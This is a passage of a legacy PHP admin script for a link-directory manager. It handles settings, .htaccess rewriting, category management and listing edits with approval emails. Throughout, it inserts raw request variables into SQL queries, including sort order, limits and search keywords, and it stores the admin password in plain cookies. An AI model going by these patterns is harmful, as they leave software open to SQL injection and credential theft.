                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/sci.htm" target="_blank">Split
                          Categories Into</a>:</font></td>
                        <td width="63%" valign="top"><font face="Tahoma" size="2"><input type="text" name="catsplit" value="<?echo $catsplit?>" size="4" style="font-family: Verdana; font-size: 8pt">
                          (columns)</font></td>
                      </tr>
                      
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/prbar.htm" target="_blank">PageRank with Listing</a>?</font></td>
                        <td width="63%" valign="top"><input type="checkbox" name="princlude" value="yes" <?if ($princlude == "yes") echo "checked"?>></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/tswl.htm" target="_blank">Thumbshot
                          With Listing</a>?</font></td>
                        <td width="63%" valign="top"><font size="2" face="Tahoma"><select size="1" name="thumbshots" style="font-family: Verdana; font-size: 8pt">
                            <option value="1" <?if ($thumbshots == "1") echo "selected"?>>No</option>
                            <option value="2" <?if ($thumbshots == "2") echo "selected"?>>All Listings</option>
                            <option value="3" <?if ($thumbshots == "3") echo "selected"?>>Reciprocal Partners Only</option>
                            <option value="4" <?if ($thumbshots == "4") echo "selected"?>>Premium Listings Only</option>
                            <option value="5" <?if ($thumbshots == "5") echo "selected"?>>Premium &amp; Reciprocated Listings</option>
                          </select></font></td>
                      </tr>
                      <tr>
                        <td width="37%" valign="top"><font face="Tahoma" size="2"><a href="help/ltd.htm" target="_blank">Link to DMOZ after DMOZ import</a>?</font></td>
                        <td width="63%" valign="top"><font size="2" face="Tahoma"><select size="1" name="linktodmoz" style="font-family: Verdana; font-size: 8pt">                        
                            <option value="0" <?if ($linktodmoz == "0") echo "selected"?>>No</option>
                            <option value="1" <?if ($linktodmoz == "1") echo "selected"?>>Yes</option>
                          </select></font></td>
                      </tr>                      
                      <tr>
                        <td width="37%" valign="top"></td>
                        <td width="63%" valign="top"></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
            </table>
          <p><center><font face="Trebuchet MS" size="2"><input type="submit" value="Save Settings" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                </center>
            </p>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?echo $footr?>
<?

}

elseif ($action == "saveglobalsettings") {

	setcookie("user", $HTTP_POST_VARS['username'], time()+(86400*30));
	setcookie("pass", $HTTP_POST_VARS['password'], time()+(86400*30));

	//phpinfo();

	$ts = array('princlude','requirerecip','lchecksuspend','lcheckemail','lcheckdelete','lcheckdeleteemail','adminapproval','emailconfirm','defaultpremium','defaultpremifrecip','premiumimage','favorpremium','newwindow','linknum', 'subcatswithmain', 'subcatsmainnum');
	while (list(,$t) = each($ts)) {
		if (!$HTTP_POST_VARS[$t]) $HTTP_POST_VARS[$t] = "";
	}
	require("settings.php");

	if ($HTTP_POST_VARS["basedir"] != $basedir) {

		rename($basedir, $HTTP_POST_VARS['basedir']);

		$newhta = "#lmasetting\n<files ".$HTTP_POST_VARS['basedir'].">\nForceType application/x-httpd-php\n</files>\n#lmasettingend";

		if (file_exists(".htaccess")) {

			$hta = implode("", file(".htaccess"));

			if (preg_match("/\#lmasetting/", $hta)) {

				$hta = preg_replace("/\#lmasetting(.+?)\#lmasettingend/s", $newhta, $hta);

			}

			else $hta .= "\n\n$newhta";

			if (is_writeable(".htaccess")) {

				$fp = fopen(".htaccess", "w");
				fputs($fp, $hta);
				fclose($fp);

				savesettings();
				message("Congratulations!", "Your administration settings were successfully saved.");

			}
			else {

				savesettings();
				message("Congratulations", "Your settings were successfully saved.<br><br><font color=red><b>Warning</b>
				The program couldn't update the file .htaccess because permissions are not set correctly. In order to
				make it work properly, you must copy the following code, save it as \".htaccess\" and upload it to your
				LMA folder.</font><br><br><p align=left><font size=3><pre style=\"text-align: left\">".htmlentities($hta)."</pre></font></p>");

			}
		}

		else {

			$fp = fopen(".htaccess", "w");
			fputs($fp, $newhta);
			fclose($fp);

			savesettings();
			message("Congratulations!", "Your administration settings were successfully saved.");

		}

	}

	savesettings();
	message("Congratulations!","Your administration settings were successfully saved.");

}





elseif ($action == "categories") {

	echo $headr;

	if ($messag) {
?>
<div align="center">
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
<tr>
                <td>
                  <p align="center"><font size="2" face="Tahoma" color="#ff0000">The categories
                  you entered were successfully added.</font></p>
                </td>
              </tr>
             </table>
            </td>
           </tr>
         </table>
       </td>
     </tr>
   </table>
 </div>
 <br>
<?
	}

?>


<div align="center">
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Category
            Management</font></b></p>
                  <p align="left"><font size="2" face="Tahoma">This section
                  allows you to manage the category structure of your link
                  directory. You can set up new categories and sub-categories,
                  manage existing categories (delete/rename), and shift an
                  entire group of listings from one category or sub-category to
                  another.</font></p>
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Add New
                  Categories</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">To add new categories enter the
                  name of the category in the field below and click the
                  &quot;Add Categories&quot; button. You can enter multiple
                  categories at a time, one per line. If you would like the new
                  categories to become sub-categories of an existing one, select
                  the respective parent category from the drop down menu before
                  clicking the &quot;Add Categories&quot; button. You can have
                  an unlimited level of categories but it would be wise to limit
                  it to 2-3 levels maximum.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
  </center>
            <tr>
              <td><center>


           <form action="admin.php" method="post" style="margin: 0px">
           <input type="hidden" name="action" value="addcat">

                <p align="center"><font face="Trebuchet MS" size="2"><textarea rows="6" name="newcats" cols="60" style="font-family: Verdana; font-size: 8pt"></textarea></font></p>
                <p align="center"><font size="2" face="Tahoma">Add as sub-category/s of:
                <select size="1" id="catparent" name="parent" style="font-family: Verdana; font-size: 8pt">
  <option value="0" selected>None</option>
  </select> &nbsp;<font size="1"><a href="javascript:choosecat('catparent')">Click here to select a category</a></font>
<?

/*function getchild($id) {

	global $link, $arnum, $opshtml;

	$opshtml = "";
	$child = mysql_query("select * from lma_categories where parent = '$id' order by name") or die(mysql_error());
	if (mysql_num_rows($child) > 0) {
		$arnum++;
		while ($tcat = mysql_fetch_object($child)) {
			$opshtml .= "<option value=".$tcat->id.">". str_repeat("&gt;", ($arnum-1)). " ". $tcat->name."</option>\n";
			getchild($tcat->id);
		}
		$arnum--;
	}

}

getchild("0");
echo $opshtml;
*/

?>
</font></p>
                </center>
                <p align="center"><font face="Trebuchet MS" size="2"><input type="submit" value="Add Categories" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>


 		   </form>

 <center>
              </center>
                </td>
              </tr>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Manage
                  Existing Categories</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td><font size="2" face="Tahoma">Listed below are the current
                  categories in your directory and the respective number of
                  listings contained within each. To change the name of a
                  category, simply make the respective changes in the input
                  field and click the &quot;Update Categories&quot; button. To
                  shift listings from one category to another, select the new
                  category you would like them moved to from the &quot;Shift
                  Listings&quot; drop down menu next to the respective category
                  and click the &quot;Update Categories&quot; button. To delete
                  a specific category, check the delete box next to the
                  respective category and click the &quot;Update
                  Categories&quot; button. This will remove the entire category
                  including all associated sub-categories and the listings found
                  within and it's not reversible.</font></td>
              </tr>
              <tr>
                <td height="20">
<?
	if (!$catid) $catid = "0";

	if ($catid != "0") {

		$goo = 1;

		$lacat = $catid;

		while ($goo == 1 and $x < 100) {

			$x++;

			$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

			if ($lacat == $catid) {
				$caturl = $pol->name;
				$caturl2 = $pol->name;
			}
			else {
				$caturl = "<a href=\"admin.php?action=categories&catid=".$pol->id."\">".$pol->name ."</a> &gt; ". $caturl;
				$caturl2 = $pol->name."/".$caturl2;
			}

			$lacat = $pol->parent;
			if ($pol->parent == "0") $goo = 0;

		}

		echo "<p><br><br><font size=\"2\" face=\"Tahoma\"><a href=\"admin.php?action=categories&catid=0\">Top</a> &gt; $caturl</font></p>";
	}
?>

                </td>
              </tr>
              <tr>
                <td>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="100%">
                      <tr>
                        <td width="42%"><b><font size="1" face="Tahoma">Category
                          Name</font></b></td>
                        <td width="11%" align="center"><b><font size="1" face="Tahoma">Listings</font></b></td>
                        <td width="40%" align="center"><b><font size="1" face="Tahoma">Shift
                          Listings&nbsp;</font></b></td>
                        <td width="15%" align="center"><b><font size="1" face="Tahoma">Delete</font></b></td>
                      </tr>

			<form action="admin.php" method="post" style="margin: 0px">
			<input type="hidden" name="action" value="editcats">
<?

/*function getchild2($id) {

	global $link, $arrnum;


	$child = mysql_query("select * from lma_categories where parent = '$id' order by name") or die(mysql_error());
	if (mysql_num_rows($child) > 0) {
		$arrnum++;
		while ($tcat = mysql_fetch_object($child)) {

			$linknum = array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '1' or status = '2' or status = '5') and category = '".$tcat->id."'")));
			$linknumin = array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '3' or status = '4') and category = '".$tcat->id."'")));

?>
                      <tr>
                        <td width="42%"><?echo str_repeat("&gt;", ($arrnum-1))?><font size="1" face="Tahoma"><input type="text" name="categs[<?echo $tcat->id?>][name]" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo htmlentities($tcat->name)?>"></font></td>
                        <td width="15%" align="center"><font size="1" face="Tahoma"><?echo $linknum?> active<br><?echo $linknumin?> inactive</font></td>
                        <td width="40%" align="center"><font size="1" face="Tahoma"><select size="1" name="categs[<?echo $tcat->id?>][shift]" style="font-family: Verdana; font-size: 8pt">
  <option value="no" selected>No</option>
<?
echo $opshtml;
?>

</select></font></td>
                        <td width="15%" align="center"><font face="Tahoma" size="1"><input type="checkbox" name="categs[<?echo $tcat->id?>][delete]" value="yes"></font></td>
                      </tr>
<?
			getchild2($tcat->id);
		}
		$arrnum--;
	}

}

getchild2("0");
*/





	$pol = mysql_query("select * from lma_categories where parent = '$catid' order by name");
	if (mysql_num_rows($pol) > 0) {
		while ($tcat = mysql_fetch_object($pol)) {

			$linknum = array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '1' or status = '2' or status = '5') and category = '".$tcat->id."'")));
			$linknumin = array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where (status = '3' or status = '4') and category = '".$tcat->id."'")));

?>
                      <tr>
                        <td width="42%"><font size="1" face="Tahoma"><?echo "<a href=\"admin.php?action=categories&catid=".$tcat->id."\"><img align=left border=0 src=\"folder.jpg\"></a>"?>&nbsp;<input type="text" name="categs[<?echo $tcat->id?>][name]" size="20" style="font-family: Verdana; font-size: 8pt" value="<?echo htmlentities($tcat->name)?>"></font></td>
                        <td width="15%" align="center"><font size="1" face="Tahoma"><?echo $linknum?> active<br><?echo $linknumin?> inactive</font></td>
                        <td width="40%" align="center"><font size="1" face="Tahoma"><select size="1" id="catedit<?echo $tcat->id?>" name="categs[<?echo $tcat->id?>][shift]" style="font-family: Verdana; font-size: 8pt">
  <option value="no" selected>No</option></select> &nbsp;<font size="1"><a href="javascript:choosecat('catedit<?echo $tcat->id?>')">select a category</a></font></font></td>
                        <td width="15%" align="center"><font face="Tahoma" size="1"><input type="checkbox" name="categs[<?echo $tcat->id?>][delete]" value="yes"></font></td>
                      </tr>
<?


			//echo "<p style=\"margin: 3px\"><a href=\"admin.php?action=categories&catid=".$tcat->id."\"><img align=left border=0 src=\"folder.jpg\"></a>&nbsp;<a href=\"admin.php?action=categories&catid=".$tcat->id."\">".$tcat->name."</a> &nbsp;<font size=1>'".</p>";
		}
	}
	else echo "<p>There are no subcategories under this category</p>";


?>



                    </table>
                  </div>
                  <p align="center"><font face="Trebuchet MS" size="2"><input type="submit" value="Update Categories" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font></td>
              </tr>


              </form>


              <tr>
                <td height="20"></td>
              </tr>
            </table>
          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?echo $footr?>

<?

}

elseif ($action == "editcats") {

	while (list($i,$inf) = each($categs)) {

		if ($inf['delete'] == "yes") {

			unset($pari);
			unset($todel);

			$todel[] = $i;

			$cats = mysql_query("select id, parent from lma_categories");
			while ($tcat = mysql_fetch_object($cats)) {

				$pari[$tcat->id] = $tcat->parent;

			}

			while (list($id,$par) = each($pari)) {

				$last = $id;
				$fnd = 0;

				while ($fnd != 1 and $atco < 10000) {

					$atco++;

					if ($pari[$last] == $i) {
						$todel[] = $id;
						$fnd = 1;
					}
					elseif ($pari[$last] == "0") {
						$fnd = 1;
					}
					else $last = $pari[$last];

				}

			}

			while (list(,$tod) = each($todel)) {
				$pol = mysql_query("delete from lma_categories where id = '$tod'") or message("Error", mysql_error());
				$pol = mysql_query("delete from lma_links where category = '$tod'") or message("Error", mysql_error());
			}

		}

		else {

			$pol = mysql_query("update lma_categories set name = '".str_replace("_", " ", $inf['name'])."' where id = '$i'")  or message("Error", mysql_error());

			if ($inf['shift'] != "no") {

				$pol = mysql_query("update lma_links set category = '".$inf['shift']."' where category = '$i'") or message("Error", mysql_error());

			}

		}

	}

	message ("Congratulations", "The categories were successfully updated.");

}

elseif ($action == "links") {

	$pol = mysql_query("CREATE TABLE if not exists`lma_links` (
`id` int(10) unsigned NOT NULL auto_increment,
`category` int(10) unsigned NOT NULL default '0',
`status` tinyint(3) unsigned NOT NULL default '0',
`confirmed` set('yes','no') NOT NULL default '',
`premium` set('yes','no') NOT NULL default '',
`title` text NOT NULL,
`description` text NOT NULL,
`url` tinytext NOT NULL,
`firstname` tinytext NOT NULL,
`lastname` tinytext NOT NULL,
`email` tinytext NOT NULL,
`recipurl` tinytext NOT NULL,
`attempts` tinyint(3) unsigned NOT NULL default '0',
PRIMARY KEY  (`id`),
KEY `category` (`category`,`status`,`premium`)
	)");

?>
<?echo $headr?>

<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
            <p align="center"><b><font face="Trebuchet MS" size="4">Link Management</font></b></p>
                  <p align="left"><font size="2" face="Tahoma">This section
                  allows you to manage the listings in your directory. You can
                  manually add new listings, edit existing listings, approve new
                  listings if you're running in semi-automated mode and conduct
                  all other listing management related tasks.</font></p>
            <p align="center"><font size="2" face="Tahoma">You currently have

<font color="#FF0000"><?echo array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_links where status = '1' or status = '2' or status = '5'")))?></font>
            listings in your directory separated into
<font color="#FF0000"><?echo array_shift(mysql_fetch_row(mysql_query("select count(*) from lma_categories")))?></font>
                    individual categories.</font></p>
  </center>
                </td>
              </tr>
  <center>
  </center>
  <center>
  </center>
            </table>
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Add New
                  Listing</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td height="20"><font size="2" face="Tahoma">To add a new
                  listing, simply enter the details of the link partner in the
                  fields below and click the &quot;Add Listing&quot; submit
                  button. The new listing will appear in the directory almost
                  immediately.</font></td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <div align="center">
                    <center>


                    <form action="admin.php" method="post" style="margin: 0px">
                    <input type="hidden" name="action" value="addlink">

                    <table border="0" cellpadding="4" cellspacing="4" width="85%">
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Title</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="title" size="50" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Description</font></td>
                        <td width="80%" valign="top"><font face="Trebuchet MS" size="2"><textarea rows="3" name="description" cols="60" style="font-family: Verdana; font-size: 8pt"></textarea></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">URL</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="url" size="50" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="100%" valign="top" colspan="2">
                          <div align="center">
                            <table border="0" cellpadding="0" cellspacing="0" width="100%">
                              <tr>
                                <td width="21%"><font size="2" face="Tahoma">Premium
                                  Listing?</font></td>
                                <td width="79%"><font face="Tahoma" size="1"><input type="checkbox" name="premium" value="yes"></font><font size="2" face="Tahoma">&nbsp;</font></td>
                              </tr>
                            </table>
                          </div>
                        </td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Category</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><select size="1" id="linkcat" name="category" style="font-family: Verdana; font-size: 8pt">
                        <option value="0">Top</option></select>
                         &nbsp;<a href="javascript:choosecat('linkcat')"><font size=1>Click here to choose a category</font></a>
<?
/*
function getchild($id) {

	global $link, $arnum;


	$child = mysql_query("select * from lma_categories where parent = '$id' order by name") or die(mysql_error());
	if (mysql_num_rows($child) > 0) {
		$arnum++;
		while ($tcat = mysql_fetch_object($child)) {
			echo "<option value=".$tcat->id.">". str_repeat("&gt;", ($arnum-1)). " ". $tcat->name."</option>\n";
			getchild($tcat->id);
		}
		$arnum--;
	}

}

//getchild("0");
*/
?>
</font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">First
                          Name</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="fname" size="20" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Last
                          Name</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="lname" size="20" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Email
                          Address</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="emailaddy" size="50" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="20%" valign="top"><font size="2" face="Tahoma">Reciprocal</font></td>
                        <td width="80%" valign="top"><font size="1" face="Tahoma"><input type="text" name="recipurl" size="50" style="font-family: Verdana; font-size: 8pt"></font></td>
                      </tr>
                      <tr>
                        <td width="100%" valign="top" colspan="2"><font size="2" face="Tahoma">Send
                          Confirmation Email? </font><font face="Tahoma" size="1"><input type="checkbox" name="sendemail" value="yes"></font></td>
                      </tr>
                    </table>
                    </center>
                  </div>
                </td>
              </tr>
              <tr>
                <td></td>
              </tr>
              <tr>
                <td>
                  <p align="center"><font face="Trebuchet MS" size="2"><input type="submit" value="Add Listing" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font></td>
              </tr>
            </table>


            </form>

            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td>
                  <p align="left"><b><u><font size="2" face="Tahoma">Manage
                  Listings</font></u></b></td>
              </tr>
              <tr>
                <td>
                  <hr size="1" color="#C0C0C0">
                </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
              <tr>
  <center>
                <td>



             <form action="admin.php"  target="lmaeditlinks" method="post" style="margin: 0px">
             <input type="hidden" name="action" value="editlinks">

                  <p><font size="2" face="Tahoma">Display <select size="1" name="status" style="font-family: Verdana; font-size: 8pt">
                    <option value="all">All</option>
                    <option value="1">Active</option>
                    <option value="3">Awaiting Approval</option>
                    <option value="premium">Premium</option>
                    <option value="4">Suspended</option>
                    <option value="5">DMOZ Imported</option>
                  </select>  listings<br><br>From the category: <select size="1" id="editlinks" name="category" style="font-family: Verdana; font-size: 8pt">
  <option selected value="all">All</option>
<?
//getchild("0");
?>
</select> &nbsp;<a href="javascript:choosecat('editlinks')"><font size=1>Click here to choose a category</font></a></font></p>
                  <p><font size="2" face="Tahoma">Show </font><font size="1" face="Tahoma"><input type="text" name="ppage" size="2" style="font-family: Verdana; font-size: 8pt" value="20">
                  </font><font size="2" face="Tahoma">listings per page<br><br>Sort
                  via <select size="1" name="sortby" style="font-family: Verdana; font-size: 8pt">
                    <option value="title">Title</option>
                    <option value="description">Description</option>
                    <option value="url">URL</option>
                    <option value="firstname">First Name</option>
                    <option value="lastname">Last Name</option>
                    <option value="email">Email Address</option>
                  </select>&nbsp; </font><font face="Trebuchet MS" size="2"><input type="submit" value="Display Listings" name="B1" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                  </p>

                  <p><br><font face="Tahoma" size="2">OR conduct a
                  specific search:<br></font><font size="1" face="Tahoma"> <input type="text" name="keyword" size="20" style="font-family: Verdana; font-size: 8pt">
                  </font><font face="Trebuchet MS" size="2"><input type="submit" value="Search" name="gosearch" style="font-family: Trebuchet MS; font-size: 8pt"></font>
                  </p>

                  </center>
  </td>
              </tr>
              <tr>
                <td height="20"></td>
              </tr>
            </table>


             </form>

          </td>
        </tr>
      </table>
    </div>
    </td>
  </tr>
  </table>
</div>

<?echo $footr?>

<?

}

elseif ($action == "editlinks") {

	dolcount();

	if (!$start) $start = 0;
	if (!$ppage) $ppage = 20;

	$base = str_replace("admin.php", "", $_SERVER['SCRIPT_NAME']). $basedir;

	if (is_array($arts)) {

		while (list($id,$art) = each($arts)) {

			$prevstat = array_shift(mysql_fetch_row(mysql_query("select status from lma_links where id = '$id'")));

			if ($art['delete'] == "yes") {

				$pol = mysql_query("delete from lma_links where id = '$id'") or die(mysql_error());
				$start--;

				if ($prevstat == "3") {

					$directoryurl = "http://".$_SERVER['SERVER_NAME']. $base."/";

					$addedtpls = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'declined'"));

					$subject = $addedtpls->subject;
					$subject = str_replace("{FIRSTNAME}", stripslashes($art['fname']), $subject);
					$subject = str_replace("{LASTNAME}", stripslashes($art['lname']), $subject);
					$subject = str_replace("{DIRECTORY-LINK}", $directoryurl, $subject);

					$body = $addedtpls->body;
					$body = str_replace("{FIRSTNAME}", stripslashes($art['firstname']), $body);
					$body = str_replace("{LASTNAME}", stripslashes($art['lname']), $body);
					$body = str_replace("{DIRECTORY-LINK}", $directoryurl, $body);

					maill($art['email'], $subject, $body, "From: $fromname <$adminemail>");

				}

			}
			else {

				if (!$art['premium']) $art['premium'] = "no";
				$pol = mysql_query("update lma_links SET title = '".$art['title']."', description = '".$art['desc']."', url = '".$art['url']."', status = '".$art['status']."', category = '".$art['category']."', firstname = '".$art['fname']."', lastname = '".$art['lname']."', email = '".$art['email']."', recipurl = '".$art['recipurl']."', premium = '".$art['premium']."' where id = '$id'") or die(mysql_error());

				if (($art['status'] == "2" or $art['status'] == "1") and $prevstat == "3" and $art['email']) {

					$listinfo = "
        Title: ".$art['title']."
          URL: ".$art['url']."
  Description: ".$art['desc']."
   First Name: ".$art['fname']."
    Last Name: ".$art['lname']."
        Email: ".$art['email']."
   Reciprocal: ".$art['recipurl'];


					$goo = 1;
					$lacat = $art['category'];

					$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));

					$caturl = "/". getindex($pol->name) . ".$pext";

					while ($goo == 1 and $x < 100) {

						$x++;

						$pol = mysql_fetch_object(mysql_query("select * from lma_categories where id = '$lacat'"));
						$caturl = "/".str_replace(" ", "_", $pol->name).$caturl;
						$lacat = $pol->parent;
						if ($pol->parent == "0") $goo = 0;

					}


					$directoryurl = "http://".$_SERVER['SERVER_NAME']. $base."/";

					$categoryurl = "http://".$_SERVER["SERVER_NAME"].$base.$caturl;

					$addedtpls = mysql_fetch_object(mysql_query("select subject, body from lma_emails where id = 'approved'"));

					$subject = $addedtpls->subject;
					$subject = str_replace("{FIRSTNAME}", stripslashes($art['fname']), $subject);
					$subject = str_replace("{LASTNAME}", stripslashes($art['lname']), $subject);
					$subject = str_replace("{DIRECTORY-LINK}", $directoryurl, $subject);
					$subject = str_replace("{CATEGORY-LINK}", $categoryurl, $subject);

					$body = $addedtpls->body;
					$body = str_replace("{FIRSTNAME}", stripslashes($art['fname']), $body);
					$body = str_replace("{LASTNAME}", stripslashes($art['lname']), $body);
					$body = str_replace("{DIRECTORY-LINK}", $directoryurl, $body);
					$body = str_replace("{CATEGORY-LINK}", $categoryurl, $body);
					$body = str_replace("{LISTING-DETAILS}", $listinfo, $body);


					maill($art['email'], $subject, $body, "From: $fromname <$adminemail>");
				}

			}

		}

	}


	$end = $start + $ppage;

?>

<?echo $headr?>



  <script>
  function DoToAll(obj_input)
  { bol_is_checked = (obj_input.checked)?true:false
    for (x=0;x<obj_input.form.length;x++)
    {  obj_input.form.elements[x].checked = bol_is_checked;
    }
  }
  </script>



<div align="center">
  <center>
  <table border="1" cellspacing="4" width="650" bgcolor="#F8F8F8" cellpadding="0" bordercolor="#C0C0C0">
  </center>
  <center>
  <tr>
    <td height="20">
    <div align="center">
      <table border="0" cellpadding="6" cellspacing="6" width="100%">
        <tr>
          <td width="100%">
            <table border="0" cellspacing="1" width="100%">
              <tr>
                <td>
            <p align="right"><a href="admin.php"><font size="2" face="Tahoma">Main
            Admin</font></a></p>
                </td>
              </tr>
              <tr>
                <td>
                  <div align="center">
                    <table border="0" cellpadding="4" cellspacing="4" width="85%">


<?


	if ($gosearch) {

		if (!$keyword) die("<font face=verdana size=2><center><p><b>Error</b></p>You must enter at least one keyword to search for");
		else {

			$kws = preg_split("/\s+/", $keyword);
			while (list(,$kw) = each($kws)) {
				if ($kw) {
					if (!$sqlsrch) $sqlsrch = "where ";
					else $sqlsrch .= " and ";
					$sqlsrch .= "(title like '%$kw%' or description like '%$kw%')";
				}
			}

			if ($status != "all") {

				$sqlstat = " and (";
				if ($status == "premium") $sqlstat .= "premium = 'yes'";
				elseif ($status == "1") $sqlstat .= "(status = '1' or status = '2')";
				else $sqlstat .= "status = '$status'";
				$sqlstat .= ")";

			}
			else $sqlstat = "";

			$res = mysql_query("select * from lma_links $sqlsrch $sqlstat and confirmed = 'yes' order by $sortby limit $start, $ppage") or die(mysql_error());
		}
	}

   else if ($urlinvalidid) {
      $res = mysql_query("select * from lma_links where id = $urlinvalidid") or die(mysql_error());
   }
   
	else {

		if ($category != "all") {
			$sqlcat = "and category = '$category'";
			$sqlstat = "and ";
		}
		else $sqlstat = "and ";

		if ($status != "all") {

			if ($status == "premium") $sqlstat .= "premium = 'yes'";
			elseif ($status == "1") $sqlstat .= "(status = '1' or status = '2')";
			else $sqlstat .= "status = '$status'";

		}
		else {
			$sqlstat = "";

		}

		$res = mysql_query("select * from lma_links where id = id $sqlcat $sqlstat and confirmed = 'yes' order by $sortby limit $start, $ppage") or die(mysql_error());

	}

	if (mysql_num_rows($res) < 1) {

?>

<tr>
<?if($urlinvalidid):?>
<td align="center"><br><br><font face="Tahoma" size="2">The link has been deleted.<br><br>&nbsp;</td></tr>
<?else:?>
<td align="center"><br><br><font face="Tahoma" size="2">There are no more links in this category.<br><br>&nbsp;</td></tr>
<?endif?>

<?
	}

	else {

?>
<form action="admin.php" id="editform" method="post" style="margin: 0px">
<input type="hidden" name="action" value="editlinks">
<input type="hidden" name="start" value="<?echo $end?>">
<input type="hidden" name="ppage" value="<?echo $ppage?>">
<input type="hidden" name="sortby" value="<?echo $sortby?>">
<input type="hidden" name="status" value="<?echo $status?>">
<?if ($gosearch):?>
<input type="hidden" name="gosearch" value="yes">
<input type="hidden" name="keyword" value="<?echo fieldize($keyword)?>">
<?elseif($urlinvalidid):?>
<input type="hidden" name="urlinvalidid" value="<?echo $urlinvalidid?>">
<?else:?>
<input type="hidden" name="category" value="<?echo $category?>">
<?endif?>

                      <tr>
                        <td width="100%" valign="top" colspan="2">
                          <hr size="1" color="#C0C0C0">
                        </td>
                      </tr>
                      <tr>
                        <td width="100%" valign="top" colspan="2"><font face="Tahoma" size="2">To
